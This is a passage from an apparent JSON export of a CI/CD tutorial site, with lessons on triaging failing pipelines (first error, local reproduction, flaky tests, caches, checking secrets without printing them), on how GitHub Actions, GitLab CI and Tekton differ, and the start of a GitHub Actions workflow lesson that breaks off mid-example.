Search the log for the first line containing \u003ccode>error\u003c/code>, \u003ccode>failed\u003c/code> or a stack trace, and check what ran just before it. Note the exact command, the working directory and the versions of tools printed at the start of the job.\u003c/p>\n\u003ch2 id=\"reproduce-it-locally\">Reproduce it locally\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"bash\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"docker run --rm -it -v &quot;$PWD&quot;:/work -w /work node:20.11 bash   # same image as the job\nnpm ci &amp;&amp; npm test                                                # same commands\nenv | sort | grep -v -i -E 'token|secret|key|pass'                # compare environment, safely\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">docker run --\u003cspan class=\"hljs-built_in\">rm\u003c/span> -it -v \u003cspan class=\"hljs-string\">&quot;\u003cspan class=\"hljs-variable\">$PWD\u003c/span>&quot;\u003c/span>:/work -w /work node:20.11 bash   \u003cspan class=\"hljs-comment\"># same image as the job\u003c/span>\nnpm ci &amp;&amp; npm \u003cspan class=\"hljs-built_in\">test\u003c/span>                                                \u003cspan class=\"hljs-comment\"># same commands\u003c/span>\n\u003cspan class=\"hljs-built_in\">env\u003c/span> | \u003cspan class=\"hljs-built_in\">sort\u003c/span> | grep -v -i -E \u003cspan class=\"hljs-string\">&#x27;token|secret|key|pass&#x27;\u003c/span>                \u003cspan class=\"hljs-comment\"># compare environment, safely\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Use the same image tag, the same commands and a clean checkout. If it passes locally and fails in CI, compare tool versions, environment variables, file permissions, time zone, available memory and network access.\u003c/p>\n\u003ch2 id=\"flaky-or-real\">Flaky or real?\u003c/h2>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>Sign\u003c/th>\n\u003cth>Likely cause\u003c/th>\n\u003cth>Fix\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>Passes on retry, fails randomly\u003c/td>\n\u003ctd>Timing, order or shared state\u003c/td>\n\u003ctd>Remove sleeps, isolate data, fix the test\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Fails only on one runner\u003c/td>\n\u003ctd>Runner disk, memory or stale cache\u003c/td>\n\u003ctd>Clean the runner, pin its image\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Fails after a dependency release\u003c/td>\n\u003ctd>Unpinned versions\u003c/td>\n\u003ctd>Use a lockfile and pinned versions\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Fails near midnight or month end\u003c/td>\n\u003ctd>Date logic\u003c/td>\n\u003ctd>Inject the clock in tests\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003cp>Track flaky tests in a list with a count. A retry hides the symptom and keeps the cost, so use it only with a limit and a ticket.\u003c/p>\n\u003ch2 id=\"caches-and-secrets\">Caches and secrets\u003c/h2>\n\u003cp>A cache keyed only on the branch name can serve old build output. Key it on a hash of the lockfile. For secrets, check that the variable exists and is not empty without printing it:\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"bash\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"[ -n &quot;${API_TOKEN:-}&quot; ] &amp;&amp; echo &quot;API_TOKEN is set (length ${#API_TOKEN})&quot; || echo &quot;API_TOKEN missing&quot;\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">[ -n \u003cspan class=\"hljs-string\">&quot;\u003cspan class=\"hljs-variable\">${API_TOKEN:-}\u003c/span>&quot;\u003c/span> ] &amp;&amp; \u003cspan class=\"hljs-built_in\">echo\u003c/span> \u003cspan class=\"hljs-string\">&quot;API_TOKEN is set (length \u003cspan class=\"hljs-variable\">${#API_TOKEN}\u003c/span>)&quot;\u003c/span> || \u003cspan class=\"hljs-built_in\">echo\u003c/span> \u003cspan class=\"hljs-string\">&quot;API_TOKEN missing&quot;\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Masking hides values in logs but does not stop a script from encoding and printing them, so never enable shell tracing in jobs that handle secrets.\u003c/p>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> A test passes alone but fails when the whole suite runs. What is the most likely reason?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> Tests share state such as a database row, a file or a global variable, and one test changes what another expects.\u003c/p>\u003cp>Run the failing test with the one before it, then isolate or reset the shared data. Random test ordering finds these problems early.\u003c/p>\u003c/div>\u003c/div>\n\u003cfigure class=\"dg\" data-rows=\"3\" data-edges=\"first&gt;repro;repro&gt;classify;repro&gt;env;classify&gt;fix;env&gt;fix\" style=\"--rows:3\">\u003cfigcaption class=\"dg-title\">Triage of a red pipeline\u003c/figcaption>\u003cdiv class=\"dg-stage\">\u003csvg viewBox=\"0 0 100 100\" preserveAspectRatio=\"none\" aria-hidden=\"true\" focusable=\"false\">\u003cline x1=\"12.5\" y1=\"50.0\" x2=\"37.5\" y2=\"50.0\"/>\u003cline x1=\"37.5\" y1=\"50.0\" x2=\"62.5\" y2=\"16.7\"/>\u003cline x1=\"37.5\" y1=\"50.0\" x2=\"62.5\" y2=\"83.3\"/>\u003cline x1=\"62.5\" y1=\"16.7\" x2=\"87.5\" y2=\"50.0\"/>\u003cline x1=\"62.5\" y1=\"83.3\" x2=\"87.5\" y2=\"50.0\"/>\u003c/svg>\u003cbutton type=\"button\" class=\"dg-node k-observe\" data-act=\"dg-pick\" data-id=\"first\" data-kind=\"observe\" style=\"left:12.5%;top:50.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">First error in the log\u003c/span>\u003cspan class=\"dg-kind\">Observability\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"repro\" data-kind=\"process\" style=\"left:37.5%;top:50.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Reproduce locally\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"classify\" data-kind=\"process\" style=\"left:62.5%;top:16.7%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Real or flaky\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"env\" data-kind=\"process\" style=\"left:62.5%;top:83.3%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Environment drift\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"fix\" data-kind=\"process\" style=\"left:87.5%;top:50.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Fix and prevent\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003c/div>\u003cp class=\"sr\">Flow in order: 1, First error in the log to Reproduce locally; 2, Reproduce locally to Real or flaky; 3, Reproduce locally to Environment drift; 4, Real or flaky to Fix and prevent; 5, Environment drift to Fix and prevent.\u003c/p>\u003cul class=\"dg-legend\" aria-label=\"Legend\">\u003cli>\u003ci class=\"dg-sw k-observe\" aria-hidden=\"true\">\u003c/i>Observability\u003c/li>\u003cli>\u003ci class=\"dg-sw k-process\" aria-hidden=\"true\">\u003c/i>Step\u003c/li>\u003cli>\u003ci class=\"dg-arrow\" aria-hidden=\"true\">\u003c/i>Numbered arrows show the order of the flow\u003c/li>\u003c/ul>\u003cp class=\"dg-hint small\">Select a component to see what it does and what happens when it fails. \u003cbutton type=\"button\" class=\"btn btn-quiet dg-flow-btn\" data-act=\"dg-flow\" aria-pressed=\"false\">Show the flow\u003c/button>\u003c/p>\u003cdiv class=\"dg-live\" role=\"status\" aria-live=\"polite\">\u003c/div>\u003cdl class=\"dg-list\">\u003cdiv class=\"dg-item\" data-id=\"first\">\u003cdt>First error in the log \u003cspan class=\"dg-kt\">Observability\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Find the earliest error, the exact command and tool versions.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> The last line usually only repeats the exit code.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"repro\">\u003cdt>Reproduce locally \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Run the same image and commands on a clean checkout.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A different local setup passes and proves nothing.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"classify\">\u003cdt>Real or flaky \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Retry once and compare with recent runs on the same commit.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Endless retries hide a genuine defect.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"env\">\u003cdt>Environment drift \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Compare versions, variables, caches and runner state.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Unpinned tools change without any commit.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"fix\">\u003cdt>Fix and prevent \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Add a pin, a test or a cache key so it cannot recur.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A one-time rerun leaves the cause in place.\u003c/dd>\u003c/div>\u003c/dl>\u003c/figure>\n\u003ch2 id=\"incident-green-yesterday-red-today-same-commit\">Incident: green yesterday, red today, same commit\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>The main branch pipeline fails at the build step with a compile error. No one changed the code since yesterday.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"diff &lt;(grep -A2 'lodash' yesterday.log) &lt;(grep -A2 'lodash' today.log)\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>diff &lt;(grep -A2 \u003cspan class=\"hljs-string\">&#x27;lodash&#x27;\u003c/span> yesterday.log) &lt;(grep -A2 \u003cspan class=\"hljs-string\">&#x27;lodash&#x27;\u003c/span> today.log)\u003c/span>\u003cspan class=\"ln out\">&lt; lodash 4.17.21\u003c/span>\u003cspan class=\"ln out\">&gt; lodash 4.18.0\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The project installed dependencies with a range and no lockfile, so a new release was picked up silently and broke the build. The team committed a lockfile, switched to \u003ccode>npm ci\u003c/code>, pinned the build image, and added a scheduled build so drift shows up before a release day.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Re-running until green\u003c/li>\n\u003cli>Reading only the last 20 lines\u003c/li>\n\u003cli>Caches keyed on a branch name\u003c/li>\n\u003cli>Printing environment variables that contain secrets\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"read-the-first-error","text":"Read the first error"},{"id":"reproduce-it-locally","text":"Reproduce it locally"},{"id":"flaky-or-real","text":"Flaky or real?"},{"id":"caches-and-secrets","text":"Caches and secrets"},{"id":"incident-green-yesterday-red-today-same-commit","text":"Incident: green yesterday, red today, same commit"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Google SRE book: Testing for Reliability","u":"https://sre.google/sre-book/testing-reliability/"},{"t":"Continuous Delivery","u":"https://continuousdelivery.com/"}],"text":"Pipelines fail for reasons that have nothing to do with your change: a cache that went stale, a dependency that moved, a runner that ran out of disk, or a test that depends on timing. If you cannot tell a real failure from noise, people start re-running until green, and real problems pass through. What you will learn Reading a failing job from the first error, not the last line Reproducing a failure outside the pipeline Flaky tests, cache problems and drift between local and CI Debugging secrets and permissions without printing them Read the first error The last lines of a job often say only \"exit code 1\". The cause is higher up. Search the log for the first line containing error , failed or a stack trace, and check what ran just before it. Note the exact command, the working directory and the versions of tools printed at the start of the job. Reproduce it locally docker run -- rm -it -v \" $PWD \" :/work -w /work node:20.11 bash # same image as the job npm ci && npm test # same commands env | sort | grep -v -i -E &#x27;token|secret|key|pass&#x27; # compare environment, safely Use the same image tag, the same commands and a clean checkout. If it passes locally and fails in CI, compare tool versions, environment variables, file permissions, time zone, available memory and network access. Flaky or real? Sign Likely cause Fix Passes on retry, fails randomly Timing, order or shared state Remove sleeps, isolate data, fix the test Fails only on one runner Runner disk, memory or stale cache Clean the runner, pin its image Fails after a dependency release Unpinned versions Use a lockfile and pinned versions Fails near midnight or month end Date logic Inject the clock in tests Track flaky tests in a list with a count. A retry hides the symptom and keeps the cost, so use it only with a limit and a ticket. Caches and secrets A cache keyed only on the branch name can serve old build output. Key it on a hash of the lockfile. For secrets, check that the variable exists and is not empty without printing it: [ -n \" ${API_TOKEN:-} \" ] && echo \"API_TOKEN is set (length ${#API_TOKEN} )\" || echo \"API_TOKEN missing\" Masking hides values in logs but does not stop a script from encoding and printing them, so never enable shell tracing in jobs that handle secrets. Predict first. A test passes alone but fails when the whole suite runs. What is the most likely reason? Your guess Answer: Tests share state such as a database row, a file or a global variable, and one test changes what another expects. Run the failing test with the one before it, then isolate or reset the shared data. Random test ordering finds these problems early. Triage of a red pipeline Flow in order: 1, First error in the log to Reproduce locally; 2, Reproduce locally to Real or flaky; 3, Reproduce locally to Environment drift; 4, Real or flaky to Fix and prevent; 5, Environment drift to Fix and prevent. Observability Step Numbered arrows show the order of the flow Select a component to see what it does and what happens when it fails. First error in the log Observability What it does: Find the earliest error, the exact command and tool versions. If it fails or is weak: The last line usually only repeats the exit code. Reproduce locally Step What it does: Run the same image and commands on a clean checkout. If it fails or is weak: A different local setup passes and proves nothing. Real or flaky Step What it does: Retry once and compare with recent runs on the same commit. If it fails or is weak: Endless retries hide a genuine defect. Environment drift Step What it does: Compare versions, variables, caches and runner state. If it fails or is weak: Unpinned tools change without any commit. Fix and prevent Step What it does: Add a pin, a test or a cache key so it cannot recur. If it fails or is weak: A one-time rerun leaves the cause in place. Incident: green yesterday, red today, same commit Incident The main branch pipeline fails at the build step with a compile error. No one changed the "},"cicd/how-ci-platforms-differ":{"html":"\u003cp>Before learning any one tool, it helps to see the model they all share. A pipeline is a set of jobs that run on workers when something happens, and each platform is a different answer to who defines the pipeline, who owns the workers and how much is built in.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The shared model: event, pipeline, job, step, runner, artifact\u003c/li>\n\u003cli>How GitHub Actions, GitLab CI and Tekton each express that model\u003c/li>\n\u003cli>What differs in hosting, extensibility and security defaults\u003c/li>\n\u003cli>A simple rule for choosing between them\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"the-shared-model\">The shared model\u003c/h2>\n\u003cp>An \u003cstrong>event\u003c/strong> (a push, a pull request, a tag, a schedule or a manual click) starts a \u003cstrong>pipeline\u003c/strong>. The pipeline is made of \u003cstrong>jobs\u003c/strong>, and each job is a list of \u003cstrong>steps\u003c/strong> that run on a \u003cstrong>runner\u003c/strong>, which is just a machine or container that executes work. Jobs can pass \u003cstrong>artifacts\u003c/strong> to each other and report a status back to the change that triggered them. Learn these words once and every platform becomes a dialect of the same language.\u003c/p>\n\u003ch2 id=\"three-dialects\">Three dialects\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# GitHub Actions: .github/workflows/ci.yml\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: make test\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># GitHub Actions: .github/workflows/ci.yml\u003c/span>\n\u003cspan class=\"hljs-attr\">on:\u003c/span> [\u003cspan class=\"hljs-string\">push\u003c/span>]\n\u003cspan class=\"hljs-attr\">jobs:\u003c/span>\n  \u003cspan class=\"hljs-attr\">test:\u003c/span>\n    \u003cspan class=\"hljs-attr\">runs-on:\u003c/span> \u003cspan class=\"hljs-string\">ubuntu-latest\u003c/span>\n    \u003cspan class=\"hljs-attr\">steps:\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">uses:\u003c/span> \u003cspan class=\"hljs-string\">actions/checkout@v4\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">make\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# GitLab CI: .gitlab-ci.yml\ntest:\n  image: alpine:3.20\n  script:\n    - make test\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># GitLab CI: .gitlab-ci.yml\u003c/span>\n\u003cspan class=\"hljs-attr\">test:\u003c/span>\n  \u003cspan class=\"hljs-attr\">image:\u003c/span> \u003cspan class=\"hljs-string\">alpine:3.20\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">make\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# Tekton: a Task is a Kubernetes resource\napiVersion: tekton.dev/v1\nkind: Task\nmetadata:\n  name: test\nspec:\n  steps:\n    - name: test\n      image: alpine:3.20\n      script: make test\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># Tekton: a Task is a Kubernetes resource\u003c/span>\n\u003cspan class=\"hljs-attr\">apiVersion:\u003c/span> \u003cspan class=\"hljs-string\">tekton.dev/v1\u003c/span>\n\u003cspan class=\"hljs-attr\">kind:\u003c/span> \u003cspan class=\"hljs-string\">Task\u003c/span>\n\u003cspan class=\"hljs-attr\">metadata:\u003c/span>\n  \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\n\u003cspan class=\"hljs-attr\">spec:\u003c/span>\n  \u003cspan class=\"hljs-attr\">steps:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\n      \u003cspan class=\"hljs-attr\">image:\u003c/span> \u003cspan class=\"hljs-string\">alpine:3.20\u003c/span>\n      \u003cspan class=\"hljs-attr\">script:\u003c/span> \u003cspan class=\"hljs-string\">make\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Actions and GitLab CI read a YAML file from the repository and run it on runners the platform schedules. Tekton has no server of its own: a Task or Pipeline is a custom resource in Kubernetes, a \u003cstrong>TaskRun\u003c/strong> or \u003cstrong>PipelineRun\u003c/strong> creates pods, and each step is a container in one pod.\u003c/p>\n\u003ch2 id=\"what-really-differs\">What really differs\u003c/h2>\n\u003cul>\n\u003cli>\u003cstrong>Where it lives:\u003c/strong> Actions is built into the hosted code service, GitLab CI into the GitLab product, Tekton into any cluster.\u003c/li>\n\u003cli>\u003cstrong>Who owns workers:\u003c/strong> hosted runners are zero effort but limited and billed by minute. Self-hosted runners give control and cost you patching and isolation work.\u003c/li>\n\u003cli>\u003cstrong>Extensibility:\u003c/strong> Actions has a large marketplace of reusable actions. GitLab leans on includes and templates. Tekton gives you building blocks and expects you to assemble your own platform.\u003c/li>\n\u003cli>\u003cstrong>Security defaults:\u003c/strong> a marketplace action is third-party code in your pipeline, a shared runner is shared infrastructure and a Tekton service account is real cluster access. Each model has a different risk to manage.\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"a-simple-choice-rule\">A simple choice rule\u003c/h2>\n\u003cp>Use the platform that sits next to your code and reviews, unless you have a clear reason not to. Choose Tekton when you must run CI inside your own clusters, need Kubernetes-native scheduling and policies, or are building an internal delivery platform. Avoid mixing three tools without a reason, because every extra system is another thing to patch, secure and teach.\u003c/p>\n\u003ch2 id=\"incident-the-pipeline-that-did-not-translate\">Incident: The pipeline that did not translate\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A migration stalled because the new platform handled caching and approvals differently.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"ci-migrate check old-pipeline.yml\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>ci-migrate check old-pipeline.yml\u003c/span>\u003cspan class=\"ln out\">warning: cache key syntax not supported\u003c/span>\u003cspan class=\"ln out\">warning: manual approval has no direct equivalent\u003c/span>\u003cspan class=\"ln out\">2 of 11 jobs need redesign\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The team had assumed a pipeline was just a list of shell commands. The commands moved easily, but caching, approvals, secrets and runner labels were platform features with different rules. They rewrote those parts on purpose, kept the build logic in scripts that any platform can call, and treated the pipeline file as a thin wrapper.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Putting all build logic inside platform-specific YAML\u003c/li>\n\u003cli>Choosing a tool by popularity instead of where code and workers live\u003c/li>\n\u003cli>Ignoring who patches and isolates self-hosted runners\u003c/li>\n\u003cli>Running three CI systems with no owner for any\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"the-shared-model","text":"The shared model"},{"id":"three-dialects","text":"Three dialects"},{"id":"what-really-differs","text":"What really differs"},{"id":"a-simple-choice-rule","text":"A simple choice rule"},{"id":"incident-the-pipeline-that-did-not-translate","text":"Incident: The pipeline that did not translate"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"GitHub Actions documentation","u":"https://docs.github.com/en/actions"},{"t":"GitLab CI/CD documentation","u":"https://docs.gitlab.com/ee/ci/"},{"t":"Tekton documentation","u":"https://tekton.dev/docs/"}],"text":"Before learning any one tool, it helps to see the model they all share. A pipeline is a set of jobs that run on workers when something happens, and each platform is a different answer to who defines the pipeline, who owns the workers and how much is built in. What you will learn The shared model: event, pipeline, job, step, runner, artifact How GitHub Actions, GitLab CI and Tekton each express that model What differs in hosting, extensibility and security defaults A simple rule for choosing between them The shared model An event (a push, a pull request, a tag, a schedule or a manual click) starts a pipeline . The pipeline is made of jobs , and each job is a list of steps that run on a runner , which is just a machine or container that executes work. Jobs can pass artifacts to each other and report a status back to the change that triggered them. Learn these words once and every platform becomes a dialect of the same language. Three dialects # GitHub Actions: .github/workflows/ci.yml on: [ push ] jobs: test: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - run: make test # GitLab CI: .gitlab-ci.yml test: image: alpine:3.20 script: - make test # Tekton: a Task is a Kubernetes resource apiVersion: tekton.dev/v1 kind: Task metadata: name: test spec: steps: - name: test image: alpine:3.20 script: make test Actions and GitLab CI read a YAML file from the repository and run it on runners the platform schedules. Tekton has no server of its own: a Task or Pipeline is a custom resource in Kubernetes, a TaskRun or PipelineRun creates pods, and each step is a container in one pod. What really differs Where it lives: Actions is built into the hosted code service, GitLab CI into the GitLab product, Tekton into any cluster. Who owns workers: hosted runners are zero effort but limited and billed by minute. Self-hosted runners give control and cost you patching and isolation work. Extensibility: Actions has a large marketplace of reusable actions. GitLab leans on includes and templates. Tekton gives you building blocks and expects you to assemble your own platform. Security defaults: a marketplace action is third-party code in your pipeline, a shared runner is shared infrastructure and a Tekton service account is real cluster access. Each model has a different risk to manage. A simple choice rule Use the platform that sits next to your code and reviews, unless you have a clear reason not to. Choose Tekton when you must run CI inside your own clusters, need Kubernetes-native scheduling and policies, or are building an internal delivery platform. Avoid mixing three tools without a reason, because every extra system is another thing to patch, secure and teach. Incident: The pipeline that did not translate Incident A migration stalled because the new platform handled caching and approvals differently. $ ci-migrate check old-pipeline.yml warning: cache key syntax not supported warning: manual approval has no direct equivalent 2 of 11 jobs need redesign The team had assumed a pipeline was just a list of shell commands. The commands moved easily, but caching, approvals, secrets and runner labels were platform features with different rules. They rewrote those parts on purpose, kept the build logic in scripts that any platform can call, and treated the pipeline file as a thin wrapper. Common mistakes Putting all build logic inside platform-specific YAML Choosing a tool by popularity instead of where code and workers live Ignoring who patches and isolates self-hosted runners Running three CI systems with no owner for any"},"cicd/actions-workflows-jobs-and-steps":{"html":"\u003cp>GitHub Actions runs automation from YAML files stored in your repository. The whole system comes down to three nesting levels, workflow, job and step, plus a small set of rules about how data and permissions pass between them.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The workflow, job and step structure\u003c/li>\n\u003cli>How jobs run in parallel and depend on each other with needs\u003c/li>\n\u003cli>Passing outputs and files between jobs\u003c/li>\n\u003cli>Setting least-privilege GITHUB_TOKEN permissions\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"structure\">Structure\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"name: ci\non:\n  push:\n    branches: [main]\n  pull_request:\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    outputs:\n      version: ${{ steps.ver.outputs.version }}\n    steps:\n      - uses: actions/checkout@v4\n      - id: ver\n        run: echo &quot;version=1.4.${{ github.run_number }}&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;\n      - run: make build\n  test:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo &quot;testing ${{ needs.build.outputs.version }}&quot;\n      - run: make test\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">ci\u003c/span>\n\u003cspan class=\"hljs-attr\">on:\u003c/span>\n  \u003cspan class=\"hljs-attr\">push:\u003c/span>\n    \u003cspan class=\"hljs-attr\">branches:\u003c/span> [\u003cspan class=\"hljs-string\">main\u003c/span>]\n  \u003cspan class=\"hljs-attr\">pull_request:\u003c/span>\n\u003cspan class=\"hljs-attr\">permissions:\u003c/span>\n  \u003cspan class=\"hljs-attr\">contents:\u003c/span> \u003cspan class=\"hljs-string\">read\u003c/span>\n\u003cspan class=\"hljs-attr\">jobs:\u003c/span>\n  \u003cspan class=\"hljs-attr\">build:\u003c/span>\n    \u003cspan class=\"hljs-attr\">runs-on:\u003c/span> \u003cspan class=\"hljs-string\">ubuntu-latest\u003c/span>\n    \u003cspan class=\"hljs-attr\">outputs:\u003c/span>\n      \u003cspan class=\"hljs-attr\">version:\u003c/span> \u003cspan class=\"hljs-string\">${{\u003c/span> \u003cspan class=\"hljs-string\">steps.ver.outputs.version\u003c/span> \u003cspan class=\"hljs-string\">}}\u003c/span>\n    \u003cspan class=\"hljs-attr\">steps:\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">uses:\u003c/span> \u003cspan class=\"hljs-string\">actions/checkout@v4\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">id:\u003c/span> \u003cspan class=\"hljs-string\">ver\u003c/span>\n        \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">echo\u003c/span> \u003cspan class=\"hljs-string\">&quot;version=1.4.$\u003cspan class=\"hljs-template-variable\">{{ github.run_number }}\u003c/span>&quot;\u003c/span> \u003cspan class=\"hljs-string\">&gt;&gt;\u003c/span> \u003cspan class=\"hljs-string\">&quot;$GITHUB_OUTPUT&quot;\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">make\u003c/span> \u003cspan class=\"hljs-string\">build\u003c/span>\n  \u003cspan 